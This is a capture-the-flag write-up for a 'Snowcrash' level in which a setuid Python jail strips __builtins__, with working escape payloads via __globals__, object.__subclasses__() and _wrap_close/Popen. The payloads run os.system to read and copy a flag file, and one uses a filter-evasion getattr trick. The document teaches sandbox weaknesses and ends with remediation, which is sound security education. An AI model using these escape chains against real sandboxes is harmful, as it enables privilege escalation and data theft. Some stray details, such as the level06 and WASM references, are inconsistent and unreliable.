# Snowcrash — Level 07

**Objective:** escalate from `level07` to `flag07`.
**Class:** Python "sandbox" that strips `__builtins__` but forgets that Python's object model is not a security boundary.

---

## 1. The setup — what the level actually is

After `su level07`, you land in a fake shell that prints:

```
Session validator v2.1.4 — restricted access
You will never escape this
```

That's not a real shell. It's a Python interpreter wrapped in a restricted namespace. From level06, the artifacts are visible:

```
/opt/snowcrash/level07/
  jail.py        -rw-r----- root:level07   (source, mode 0640)
  prisonlib.pyc  -rw-r----- root:level07   (bytecode, mode 0640)
  snowcrash      -r-sr-x--- flag07:level07 (setuid, mode 4750)
```

`snowcrash` is setuid **flag07**. When a `level07` user runs it, the process's **effective uid** becomes `flag07`. That's the privilege we're trying to reach.

`jail.py` is the Python entry point. It sets up a "sandboxed" namespace — a dict of names the user is allowed to call (`ls`, `cat`, `id`, `whoami`, `find`, `exit`, etc.) — and passes that dict to `exec` as `globals`, with `__builtins__` set to `{}`. The intent is: the user can call these safe helper functions, but nothing else, because `open`, `__import__`, `eval`, `exec`, `os`, `sys` etc. aren't in the namespace.

The flaw is that **`__builtins__ = {}` is not a security boundary.** It hides some names from the eval'd code, but it does not restrict the Python runtime. Three escape routes remain open; this writeup walks through all three.

---

## 2. Probing the jail — the thought process

### Step 1 — "Is this even a shell?"

You pasted `clear` and got:

```
Validator: name 'clear' is not defined
```

`Validator:` is a Python exception handler formatting a caught exception. The message **"name 'clear' is not defined"** is a `NameError` — the exact wording Python emits when you evaluate a bare identifier that isn't defined in the current scope. That tells you immediately: **every line you type is being run through Python's `eval` or `exec`, not through `sh`.**

Confirmation: `exiy` (typo for `exit`) gives the same `name 'exiy' is not defined`. A real shell would say `command not found`.

### Step 2 — "What's already defined?"

Try commands that exist in any normal shell and see which produce Python output vs which produce shell-ish output:

| input | output | interpretation |
|---|---|---|
| `ls` | lists files in current directory | Python function named `ls` |
| `cat README` | reads the file's contents | Python function named `cat` |
| `id` | `uid=2007(level07) gid=2007(level07)` | This is *either* a Python function calling the shell's `id`, or the shell's `id` somehow; either way, `id` is defined |
| `whoami` | `level07` | same |
| `find / -user flag07` | `Validator: Validator: find: permission denied` | `find` exists, but its implementation is restricted (note the doubled "Validator:" — the jail is intercepting `find`'s error and re-wrapping) |

From this you conclude: **`ls`, `cat`, `id`, `whoami`, `find`, `exit` are pre-defined Python functions.** They are inside `jail.py`'s own code.

### Step 3 — "Is `cat` behaving normally?"

The most interesting line in your session was:

```
cat RE
Validator: cat: /home/level07/RE: No such file or directory
```

Wait — you asked for `RE`, and it reported `/home/level07/RE`. So `cat` is **joining its argument to `/home/level07/`** before opening. That means:

1. `cat` is a *Python helper* (not `/bin/cat` via subprocess).
2. It confines path resolution to `/home/level07/` by string concatenation.
3. Even `cat ../../opt/...` fails with a joined path `/home/level07/../../opt/...` that the jail's `cat` refuses (or something under the jail's chroot-like view).

Also you saw: `cat README` works. So `cat` does allow reading files that exist under `/home/level07/`. The jail isn't a strict sandbox — just a path-prefix jail.

**Key insight**: this tells us the jail is doing all of its work **inside Python** — it's a Python function that either `open`s the file or shells out. Either way, it's a Python object we can introspect.

### Step 4 — "What builtins do I have?"

```
__builtins__
```

returns `{}`. This is the *effective* `__builtins__` inside the eval scope — the jail author gave the interpreter an empty dict for builtins. So inside the eval namespace, `open`, `__import__`, `eval`, `exec`, `breakpoint`, `help` are all undefined.

But **`__builtins__ = {}` is just a dict.** The Python runtime still has all of its machinery — classes, methods, closures, function globals — available as **attributes of objects that already exist**. That's not something `__builtins__` controls.

### Step 5 — "What can I get to from the names I *do* have?"

You have `ls`, `cat`, `id`, `whoami`, `find`, `exit`. These are **Python functions**. Every Python function has these attributes:

| attribute | what it gives you |
|---|---|
| `__globals__` | the *global namespace of the module where the function was defined* — the entire `jail.py` module namespace |
| `__code__` | the compiled bytecode; `__code__.co_consts` may include strings from the source |
| `__closure__` | any captured variables (if it's a closure) |
| `__name__` | the function's name — useful for finding it |
| `__module__` | the module it came from |

**`cat.__globals__` is the whole game.** It's the namespace that `jail.py` was executing inside when it defined `cat`. That namespace contains everything `jail.py` imported or defined at module level — including `os`, `sys`, `subprocess`, `open`, `__builtins__` (the *real* dict, not the stripped one you see in the eval scope), and any file paths the jail uses.

You didn't try `cat.__globals__` yet. That's the strongest escape and should be your first move.

---

## 3. Escape route A — `__globals__` via jail helper functions

### The principle

Every Python function remembers where it came from. `f.__globals__` is the module-level namespace the function was defined in. It's not restricted by `__builtins__`. It's not restricted by `eval`'s globals dict. It's a **live dict** — modifying it modifies the module's namespace, and reading it reads everything the module had at definition time.

### The steps

**1. Inspect the helper's globals:**

```
cat.__globals__
```

You expect a dict. Look for keys like `os`, `sys`, `subprocess`, `open`, `__builtins__`, `Path`, `PurePath` etc. Any of them can be used.

**2. Find a callable with real power:**

If `open` is in the dict (very likely — `cat`'s implementation almost certainly calls `open`), use it directly:

```
cat.__globals__['open']('/home/flag07/.flag').read()
```

If `open` isn't there, check for `os`:

```
cat.__globals__['os'].system('cat /home/flag07/.flag > /tmp/l7 2>&1; chmod 666 /tmp/l7')
```

Or `subprocess`:

```
cat.__globals__['subprocess'].check_output(['cat','/home/flag07/.flag'])
```

Or the real `__builtins__` dict — `cat.__globals__['__builtins__']` returns the **module's actual builtins**, which include everything:

```
cat.__globals__['__builtins__']['open']('/home/flag07/.flag').read()
cat.__globals__['__builtins__']['__import__']('os').system('cat /home/flag07/.flag')
```

**3. Redirect output to a file `level06` can read:**

Since you're escaping the jail anyway, the easiest thing is to have the payload write to a path outside `/home/level07/`:

```
cat.__globals__['os'].system('cat /home/flag07/.flag > /tmp/l7 2>&1; chmod 666 /tmp/l7')
```

Then, outside the jail (as level06), `cat /tmp/l7`.

### Why this works even though `__builtins__ = {}`

Because `__builtins__ = {}` sets the *eval's globals dict*'s `__builtins__` key. It does not affect:
- The function objects already defined in `jail.py`.
- Those functions' `. __globals__`.
- The contents of those globals dicts (including the actual `__builtins__` of `jail.py`, `os`, `open`, etc.).

`__builtins__ = {}` restricts **what the eval'd code sees when it looks up a bare name.** `cat.__globals__` is an attribute access — not a name lookup — so the restriction doesn't apply.

---

## 4. Escape route B — the Python class hierarchy

Even if `__globals__` is stripped (for example if `jail.py` defines helper functions as `lambda` in a stripped scope), **Python's object graph still connects everything**. This is the classic "well-known Python jailbreak."

### The principle

Every object has `__class__`, and every class has a base class chain ending at `object`. Every class has `__subclasses__()` — which returns every class currently loaded into the interpreter. Among them will be classes like `_io.FileIO`, `_io.BufferedReader`, `subprocess.Popen`, `warnings.catch_warnings`, `os._wrap_close` — each of which has **methods with useful capabilities**, and **methods carry `. __globals__`** themselves.

### The steps

**1. Get the subclass list:**

```
().__class__.__base__.__subclasses__()
```

- `()` is a tuple
- `().__class__` is `tuple`
- `().__class__.__base__` is `object`
- `object.__subclasses__()` returns every class in the interpreter

**2. Filter it for interesting names:**

```
[x for x in ().__class__.__base__.__subclasses__() if 'FileIO' in x.__name__]
```

You want classes like `_io.FileIO`, `_io.BufferedReader`, or better `_wrap_close` (whose `__init__.__globals__` contains the full `os` module and `subprocess`).

**3. Use it:**

File IO:

```
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == '_io.FileIO'][0]('/home/flag07/.flag','r').read()
```

Shell escape via `_wrap_close`:

```
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == '_wrap_close'][0].__init__.__globals__['system']('cat /home/flag07/.flag > /tmp/l7; chmod 666 /tmp/l7')
```

Or via `Popen` if it's in the subclass list:

```
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'Popen'][0](['cat','/home/flag07/.flag']).communicate()
```

### Why this works

`__subclasses__()` is a method of `object`, and `object` is always defined — it's the root of the class hierarchy. `__builtins__ = {}` doesn't remove `object`. It doesn't affect `__class__`, `__base__`, `__subclasses__`, or any of the attributes on class objects. **You do not need builtins to climb the class tree.**

If the class list is truncated by filter code, the fallback is `object.__subclasses__()` called via `getattr` with computed names:

```
getattr(getattr((), '__clas' + 's__'), '__bas' + 'e__').__subclasses__()
```

Or via a helper function's globals (route A), which can also return `object`.

---

## 5. Escape route C — `__code__` constants

When the previous two fail (rare), you can mine the compiled bytecode:

```
cat.__code__.co_consts
```

`co_consts` often contains strings and small values that the function used. If the jail function string-builds a path like `os.path.join('/home/level07', user_arg)`, the string `/home/level07` will appear here.

```
cat.__code__.co_names
```

The names the function looks up — often reveals identifiers (`open`, `strip`, etc.) that the function relies on. If `open` is here, `cat.__code__.co_names` tells you the function reaches for it, and `cat.__globals__['open']` will return it.

This route is mostly diagnostic. Route A or B will almost certainly work first.

---

## 6. Why the WASM approach from level 05 doesn't apply here

At level 05, you exploited a **setuid timer running a file the attacker's group could write**. The file itself was the target — replace it, the timer runs your code.

Here, the executable is `snowcrash`, owned by **root**, mode `4750` (setuid flag07, group-execute only). You can't write to it. Its purpose is to launch Python and drop you into the jail. So the vulnerability is **inside the Python code**, not the file permissions.

Different class: **sandbox escape**, not **file replacement**.

---

## 7. What "escape" actually gives you

Once you have `open` or `os` inside the jail, you have **full Python as user flag07** (because the setuid binary is what launched Python — the jail inherits flag07's effective uid). That means:

- `open('/home/flag07/.flag').read()` → the flag
- `os.system('id > /tmp/l7_probe')` → verifies `euid=flag07`
- `os.system('find / -user flag07 -type f -exec ls -la {} + > /tmp/l7')` → enumerates everything flag07 owns, in case `.flag` is empty (the pattern from level 05)

If `cat /tmp/l7` from level06 shows that `.flag` is empty, the exploit mechanism is still correct — the flag file itself is misprovisioned.

---

## 8. Remediation (for the hypothetical case where you were fixing this jail)

- **`__builtins__ = {}` is not a sandbox.** Never rely on it. Use `RestrictedPython` or a proper process-level sandbox (e.g., `bubblewrap`, `firejail`, or run the "jail" as a genuinely unprivileged user).
- **If you must do in-process sandboxing**, run it inside a **subprocess** with dropped privileges, not inside a setuid Python. The setuid bit + Python interpreter combination is a footgun — Python's runtime has too many escape routes.
- **`os.system` and `subprocess` are exec sinks**, regardless of how deeply you think you've stripped builtins.
- **Do not define helper functions in the same module as the sandbox.** Defining `cat`, `ls`, etc. in `jail.py` and passing them into the eval scope leaks the entire module namespace via `. __globals__`.

---

## 9. Lessons

- **`__builtins__ = {}` is a name-lookup restriction, not a sandbox.** Python's attribute access is unrestricted. Any object you can reach exposes its methods; any function exposes its defining module.
- **`function.__globals__` is the module's namespace.** If a function was defined in `jail.py`, you can read every import `jail.py` made. This is why "safe helpers" defined in the same module as the sandbox are a critical error.
- **`object.__subclasses__()` is always available.** It's a method on `object`, always defined, always callable from any instance. Every Python jailbreak that survives the `__builtins__ = {}`-style restriction uses this route.
- **`(?{...})`-style "advanced feature" pragmas are the same class of bug as `re 'eval'`.** Whenever a language provides an escape hatch that's documented as "dangerous" or "you know what you're doing," and user input reaches it, that's a bug. Perl's `re 'eval'`, Python's `eval` / `exec`, Ruby's `eval` / `instance_eval` — all the same class.
- **A "sandbox" is only a sandbox if it runs in a separate OS-level context.** In-process restrictions can be escaped; process-level restrictions (uid, seccomp, namespaces) require escaping an OS boundary. The Snowcrash level 07 jail is not a real sandbox — it's a Python namespace restriction, and Python namespaces are not security boundaries.
- **The exploit path is often "one attribute away."** You don't need to escape the interpreter if you can reach something the interpreter already trusts. `cat.__globals__['os']` is one lookup. The hunt is not for exotic escape tricks — it's for the shortest attribute chain from a name you have to a name you want.